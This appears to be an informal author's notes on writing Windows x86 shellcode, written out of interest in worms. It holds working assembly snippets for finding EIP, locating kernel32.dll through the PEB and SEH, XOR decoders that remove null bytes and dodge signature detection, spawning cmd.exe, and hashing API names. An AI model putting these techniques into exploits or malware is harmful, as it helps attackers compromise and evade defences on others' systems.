@@ -1,0 +1,561 @@
+
+Just some notes on windows shell code..might find em interesting.
+Very short..
+
+This is not strictly a technical paper, this is not a tutorial on shellcode either.
+Contained within the text are just some basic notes in relation to shell code
+on x86 intel processor.
+There is no guarantee that the information contained within is 100% accurate.
+
+Its quite rough stuff..i have to admit, but its not an article or paper.
+It was planned, but there is plenty of stuff out there already on this
+subject, no need for another one.
+
+This text will cover some aspects of programming in x86 assembly and is
+assumed you have atleast, an average understanding of this language.
+There is assumption you know about PE file structure and shellcode
+on windows too.
+
+Certain solutions to problems will be familiar to experienced virus
+writers and so may not interest them, or you.
+You're not advised to read, but maybe bored enough to read on anyway :)
+
+I wrote the code from interest in internet worms.
+It is of my view that any successful 
+computer virus which propagates, does so through means of exploiting a weakness..
+whether it be of a human emotional, psychological, sociological, political or sexual reason..
+or in our case exploiting software, in what I would say is technical.
+Of course, it can be a variation of 2 or 3 weaknesses, perhaps
+working together.
+
+But as i said already, this is just some notes.
+Nothing about viruses in general.
+
+So, lets get on with it.
+
+	---[ Obtaining position in memory
+
+The reasons for this are obviously to address the issue of displacement.
+It might be a case that you want to decrypt some code in memory, but
+do not know exactly where in memory the code is going to execute.
+Or to pass data parameters to api..
+
+The address of encrypted code must be independent, able to run in any memory location.
+So, before you calculate any relative address containing your code, you
+must find out where you are, by obtaining the value of EIP register.
+
+There are a few ways to do this.
+
+; method 1
+	call gdelta
+gdelta:
+	pop esi
+
+; method 2 
+	fabs
+	fnstenv [esp]		; store fpu/cpu state.
+	mov esi, [esp + 12]	; 12 bytes
+	add	esi, 12
+
+; method 3
+	push 90909090h 	( general opcodes )
+	mov eax, esp
+	call eax		; 9 bytes 
+
+; method 4 
+	jmp get_entry_point
+gdelta:
+	pop esi
+
+get_entry_point:
+	call gdelta 	; 8 bytes 
+
+; method 5
+	fldz
+	fnstenv [esp-12]
+	pop esi
+	add esi, 10 	; 10 bytes altogether 
+
+All good in their own way, but there are some things you should remember.
+
+Method 1 will generate the smallest code, but will contain null bytes.
+4 will generate second least amount of code, but will require
+multiple jumps if the destination address is a distance of more than 128 bytes.
+
+Personally, I would go with either method 3 or 5.
+Using method 3 allows us to execute atleast 1 opcode instruction..which
+could perhaps be a parameter to an api, while at the same time retrieving
+value of EIP.
+
+But if the code is under 128 bytes, then method 4 is good choice.
+
+Method 3 may confuse some of you, the repeated 90 4 times is just NOP opcode,
+as example, but they would normally be opcode of PUSH/POP/RET according to
+register you wish EIP to be stored in.
+
+I can't exactly remember where I saw this cool trick of getting EIP..but the
+code example I saw didn't work, (maybe intentionally) 
+It was something like this (without addresses of course):
+	
+:00402058 685E56C390     push   90C3565E
+:0040205D FFD4           call   esp
+:0040205F 90		 nop
+
+The above doesn't work, when CALL is executed by processor, it pushes displacement
+of next instruction on to stack, and then executes byte values of address
+instead of the code we want.
+This is what happens in memory, after call.
+
+:0012FFBC 5F             pop    edi			; <- execute from here first which is return address!
+:0012FFBD 204000         and    [eax],al		; :0040205F
+:0012FFC0 5E             pop    esi			; <- code supposed to execute.
+:0012FFC1 56             push   esi
+:0012FFC2 C3             ret
+:0012FFC3 90             nop
+
+The correct way to get EIP using the mentioned tech would be:
+
+:00402058 685E56C390     push   90C3565E
+:0040205D 8BC4           mov    eax, esp
+:0040205F FFD4           call   eax
+
+Now executing code on stack would look like:
+
+:0012FFC0 5E             pop    esi			; put EIP in esi
+:0012FFC1 56             push   esi			; now push value back on stack
+:0012FFC2 C3             ret				; and return to its value
+:0012FFC3 90             nop				; nop just here to pad.
+
+Which is what you, I probably want.
+It could be the case that the shellcode I saw was deliberatly broken
+by the author to stop certain individuals including it in code of some sort without
+knowing what it did properly.
+I don't know for sure.
+
+;=======================================================================================
+
+	---[ Creating stack frame for local variables.
+
+We can't use global variables where shell code is concerned, obviously.
+Creating a stack frame to hold our api addresses and any other information,
+socket handles, pipe handles..etc is our best option.
+
+Its important to remember, atleast keeping code size minimum,
+to keep data within -128 +127 byte limit in stack memory.
+By following this rule, means only 3 bytes per opcode register addressing variables,
+such as a call,mov,jmp,push..etc
+
+This gives us just under 256 bytes of memory, which is plenty for shell code anyway.
+
+A:
+	add	esp, -255			; allocate 40 dwords + 1 byte
+	dec	esp				; align by 4
+
+we can use enter instruction, like:
+	
+	enter 256,00h
+
+but this has null bytes in opcode, as would:
+	
+	push	ebp
+	mov	ebp, esp
+	sub	esp, 256
+
+or just 
+	sub	esp, 256
+on its own..
+
+;=======================================================================================
+
+	---[ Issue of kernel32.dll base address.
+
+The base address of kernel32.dll differs from system to system, and you
+should never assume it to be the same on all.
+
+Its not wise to hardcode api addresses and module base addresses, because
+as the very first windows virus demonstrated, named "Bizatch", it can
+cause undesired operations with uncompatible systems.
+
+If you want your code to run on as many systems as possible, obtaining
+base address of kernel32.dll is essential.
+
+There have been various ways describing how this can be done.
+Just looking at the plethora of 32-bit viruses will show you how
+where most have stemmed from.
+
+You could scan SEH memory for PE signature.
+Check import tables for current PE file, grabbing apis..
+Like GetModuleHandle or LoadLibrary in IAT..but
+these are not very good in my opinion.
+
+It wasn't until Ratter/29a showed us probably
+the most stable way to obtain the base of KERNEL32.DLL
+with this code..atleast for Win2k/XP
+
+--[A:
+	mov	eax, fs:[30h]
+	mov	eax, [eax + 0ch]
+	mov	esi, [eax + 1ch]
+	lodsd
+	mov	ebx, [eax + 08h]
+ 
+This is good, because all win2k/xp systems have PEB, and
+that makes it stable..
+Windows operating system itself uses the data in PEB to complete
+task of many API, so we can rely on the information being correct,
+unless its deliberately modified, although unlikely at this time.
+
+LeathalMind/Ex-29a also shows us a great way, providing we
+have an arbitrary address of KERNEL32.DLL or any PE file.
+Here, we use default windows SEH address, assuming that handler is inside kernel32.dll
+
+	xor	ecx, ecx
+	mov	esi, fs:[ecx]
+	lodsd
+	lodsd
+get_k32:
+	dec	eax
+	movzx	ebx, word ptr [eax + 3ch]		; start of PE header
+	cmp	eax, dword ptr [ebx + eax + 34h]	; value in eax equal to base address in PE?
+	jne	get_k32
+
+This is OK, providing the software being exploited doesn't have an SEH already setup.
+
+You could scan the SEH address for PE signature,
+this however is not alll very stable, and sometimes cause undesirable operation.
+Before scanning, it might be wise to setup your own Exception handler.
+
+;=======================================================================================
+
+	---[ Obfuscation routines.
+
+Rather than call a tiny routine which xors a byte against a known
+constant encryption, I call it obfuscation.
+
+The requirement of these is down to basic fact of C lib functions,
+or maybe just to hide strings from signature detection / IDS (Intrustion Detection Systems)
+Could also be the case that the code contains carriage return or linefeed bytes which
+can affect the buffer overflow in some way.
+
+The string copy function strcpy, or lstrcpy from Win32 api copies
+bytes from a location to suitably sized buffer until a null byte is
+encountered.
+
+Would it be safe to say that 100% of buffer overflows are a result of strcpy
+implementation..??
+No, but majority of them are.
+
+There would be a problem if our shell code contained null bytes,
+and must therefore be eliminated through obfuscating those nulls.
+If this wasn't done, not all malcode would be copied by function appropriately, 
+and then nothing would happen, or worse, there would just be a crash of software.
+
+	lea	esi, [code]
+	lea	edi, [code_buffer]	; could be stack space..or just same address as code in esi
+	mov	ecx, [code_size]
+unload:
+	lodsb
+	xor	al, 90h
+	stosb
+	loop	unload
+
+;=============================
+	lea	esi, [code]
+	mov	ecx, [code_size]
+unload:	
+	xor	byte ptr [esi + ecx], 90h
+	loop	unload
+
+Its not impossible to live without obfuscation routines, and can sometimes
+be acheived.
+;=======================================================================================
+	
+	---------------------[ Hints / Tips
+	
+	I ran into some problems when writing the assembly codes.
+	Also picked up some useful ideas too.
+
+	Maybe its not a bad idea to highlight problems and ideas,
+	they may aid you in this process.
+
+	Stack misalignment
+	===================
+	
+	The first problem I encountered, which baffled me for quite some
+	time was the fact that CreateProcessA wouldn't execute cmd.exe
+	as it should have..
+	
+	I kept thinking it was something to do with initial values of
+	PROCESS_INFORMATION or STARTUPINFO structures stored in stack space.
+	Eventually, I remembered reading text in some virus where author
+	explained how he spent 2 days trying to solve a problem with
+	API execution..
+
+	Somewhere along the line of execution was an exception, and it was:
+	NTSTATUS_DATATYPE_MISALIGNMENT
+
+	CreateProcessA using code below won't execute on my own Windows 2000 system..
+	i've added a fill memory function, just incase you are in any doubt
+	as to why it won't run
+	Read the comments where 5 bytes of stack space is created..
+	The reason is because the stack is not aligned on 16-byte boundary.
+
+[====================================== code snippet begin
+
+szCmd		db	"cmd.exe",00h
+
+pinfo		PROCESS_INFORMATION	<?>
+stinfo	STARTUPINFO			<?>
+
+.code
+	assume fs:nothing
+main:
+	xor	eax, eax
+
+	push	sizeof pinfo	; zero infitialise memory
+	push	eax
+	lea	eax, [pinfo]
+	push	eax
+	call	fill_mem
+
+	push	sizeof stinfo
+	push	eax
+	lea	eax, [stinfo]
+	push	eax
+	call	fill_mem
+
+	push	ebp
+	mov	ebp, esp
+	add	esp, -5	; misaligned stack by 1 byte
+				; if you change the 5 to 4, or something divisable by 4.
+				; CreateProcessA should run successfully.
+				
+				; even by 1 byte, CreateProcessA as will some other API
+				; fail to execute properly.
+
+	push	offset pinfo
+	push	offset stinfo
+	push	eax
+	push	eax
+	push	eax
+	push	TRUE
+	push	eax
+	push	eax
+	push	offset szCmd
+	push	eax
+	call	CreateProcessA
+
+	push	eax
+	call	ExitProcess
+
+fill_mem:
+	enter	00h, 00h
+	pushad
+	mov	edi, [ebp + 08h]	; buffer to fill
+	mov	eax, [ebp + 0ch]	; character to fill buffer with
+	mov	ecx, [ebp + 10h]	; size of buffer
+	mov	edx, ecx
+	shr	ecx, 2		; size / 4
+	and	edx, 3		; size % 4
+	rep	stosd
+	mov	ecx, edx
+	rep	stosb
+	popad
+	leave
+	ret	3*4
+
+====================================================== code snippet end
+
+	Direction Flag Assumption
+	=========================
+
+	In alot of asm code, even that of which doesn't involve shell codes, you
+	may have no doubt seen the use of CLD instruction quite alot.
+	Basically, it dictates the direction in which some instructions should
+	address memory.
+	
+	If DF is cleared, then instructions such as SCASB/MOVSB will progress
+	forward with ESI or EDI, either incrementing by 1, adding 2 or 4
+	for SCASW/MOWSW..SCASD/MOVSD during its operation.
+
+	If its set, with STD then the same instructions will move backwards,
+	decrementing by 1, or subtracting by 2 or 4..etc
+	Those of you who know assembler will know what i'm talking about
+	even if i can't explain it properly to those who don't.. 
+	
+	It was important to remember the state of DF when programming in 16-Bit MS-DOS
+	days, because the flags were never saved, like you might see register
+	values saved on entry to a routine using PUSHAD/POPAD.
+	Not much has changed with windows..in a way, but DF is not modified generally,
+	except maybe by code inside the nt kernel.
+	
+	CLI & STI had similar issues with MS-DOS based Windows operating systems.
+	
+	For example, if you attempted to change the time and date of a
+	Win98 computer from an MS-DOS 16-Bit program using interrupts, nothing
+	would happen..unless that is of course you cleared the interrupt flag
+	using CLI, then executed the appropriate time change function using INT 21h
+	Time and date would change without fault..
+	
+	Its minor detail, but something similar to the issue with CLD/STD.
+	The flags register can cause some undesired operations in Windows,
+	because its never really checked.
+	
+	To get to the point..
+
+	Lets imagine we want the base address of kernel32.dll, and you set DF to 1
+	
+	std						; DF = 1
+	@pushsz	'kernel32.dll'		; push string onto stack using macro
+	call	GetModuleHandleA
+	
+	In call to GetModuleHandleA using string arguement, the following function is called within:
+
+NTDLL.RtlInitAnsiString
+:77F9194E 57             push   edi
+:77F9194F 8B7C240C       mov    edi,[esp+0C]		; 'kernel32.dll' arguement.
+:77F91953 8B542408       mov    edx,[esp+08]		; structure to hold pointer of string and length
+:77F91957 C70200000000   mov    dword ptr [edx],00000000
+:77F9195D 897A04         mov    [edx+04],edi		; save pointer to string in structure
+:77F91960 0BFF           or     edi,edi			; is it for executing module?
+:77F91962 7411           je     NTDLL.77F91975 (77F91975) ; go here, else
+:77F91964 83C9FF         or     ecx,FFFFFFFF			; initialize ecx to -1
+:77F91967 33C0           xor    eax,eax		; find null byte in string.
+:77F91969 F2AE           repnz scasb		; this assumes that direction flag is cleared. DF = 0
+:77F9196B F7D1           not    ecx			; invert to get length
+:77F9196D 66894A02       mov    [edx+02],cx		; save length + null byte
+:77F91971 49             dec    ecx
+:77F91972 66890A         mov    [edx],cx			; and length without null byte
+:77F91975 5F             pop    edi
+:77F91976 C20800         ret    0008
+
+	so, if we set the direction flag using STD instruction, 
+	the above routine RtlInitAnsiString will scan backwards in memory, and either
+	crash or store invalid length, eventually causing the rest of the API to fail.
+
+	Its also the reason why alot of viruses with Poly/Meta engines would
+	crash a system on occasion...
+
+	Mental Driller/29a highlighted this detail when coding MetaPHOR. - 29#6
+	
+	The direction flag is almost always cleared on Windows 2000/XP, so there
+	is no need for CLD instruction.It may need to be added depending
+	on software being exploited..but usually in USER MODE, its not neccessary.
+	
+	ANSI versions of GetModuleHandle or LoadLibrary, 
+	and no doubt other ANSI related functions are affected by STD too.
+	
+	Which brings to mind, possible local buffer overflows in relation
+	to kernel.But I have not properly investigated this..so am not sure.
+	
+;###############################################################################
+
+	Operand size instructions.
+	==========================
+	
+	You probably all know about lodsw,movsw,scasw instructions, of course.
+
+	But, you don't hear or see much of loopw,pushw,popw, popaw or enterw and leavew
+
+	They are not new instructions.
+	Simply, they inform the assembler that the generated opcodes will
+	work with 16-Bit values, and not 32 which is what the assembler would first assume,
+	if of course the assembler directive specifies 386 or greater in asm file.
+	
+	And so the assembler inserts 66h or 67h prefix onto 32-bit opcode.
+	Lets say enterw won't work with your current version of MASM.. ;)
+	This macro could implement it..
+
+enterw	macro	size, level
+	db	66h,0C8h
+	dw	size
+	db	level
+endm
+	
+	what if you only want 16-bits of immediate value placed on stack?
+	
+	pushw	0
+
+	The above would solve your problem..
+	Under the hood, the opcodes are no more than this:
+
+	66h,6Ah,00h
+
+	Exact same as normal looking PUSH opcode, except the above has 66h prefixed.
+	And as was explained, this tells the CPU to use 16-Bits, not 32.
+
+	OK, big deal, what good is it anyway?
+	Its just so you know.. ;)
+	
+	imagine our decoder looks like this:
+	
+	; get entry point..etc
+	
+	lea	edi, [asm_code]
+	xor	ecx, ecx
+	mov	cx, 1234h
+decode:
+	xor	byte ptr [edi], 99h
+	loop	decode
+
+	You could eliminate the xor ecx, ecx and insert LOOPW to save 1 byte.
+	Wow! i hear you, man..thats awesome ;)
+	
+	There can be some uses of 16-Bit instructions, and its good to remember that.
+	If only to make a minor difference.
+
+;###############################################################################
+
+	Calculating API hashes.
+	=======================
+	
+	Its quite shitty to manually calculate a hash of an
+	API, insert it into some code, only to discover later that you must
+	change it because the hashing routine wasn't adequate enough.
+	
+	It can also be very confusing looking at numbers without comments and not
+	be able to understand what they mean..
+	Just makes everything cryptic looking and un-manageable.
+	
+	It would be convenient to have a little macro, easily modified, which
+	would generate the hash to an API string..making code all that much clearer.
+	
+	It can be done, thankfully.
+	
+	Here is a MASM/TASM macro with defined constant used in checksum of api string.
+
+
+HASH_CONSTANT	EQU	7
+
+;					macro for generating 16/32-bit api hashes
+hashapi	macro	szApi
+	local	dwHash
+	local	wHash
+
+	forc x, <szApi>
+		dwHash = dwHash + "&x"
+		dwHash = (dwHash shl HASH_CONSTANT) or (dwHash shr (32-HASH_CONSTANT))
+	endm
+	wHash = dwHash and 0ffffh
+
+	dw	wHash				; 16 bit
+	dd	dwHash			; 32-bit
+endm
+
+	Its not as flexible as could be, but you are welcome to modify it if you wish.
+	Some suggestions are to add another arguement to macro when determining whether
+	its 16 or 32 bit hashes to be generated.
+	A pre-defined value may also decide this.
+	
+	There is NASM style similar macro on the net somewhere..can't remember url.
+
+;##############################################################################
+	Acknowledgements
+	================
+	
+	http://29a.host.sk/
+	http://z0mbie.host.sk/
+	http://lsd-pl.net/
+	http://www.metasploit.com/
+	http://www.nologin.net/
+	http://www.darklab.org/
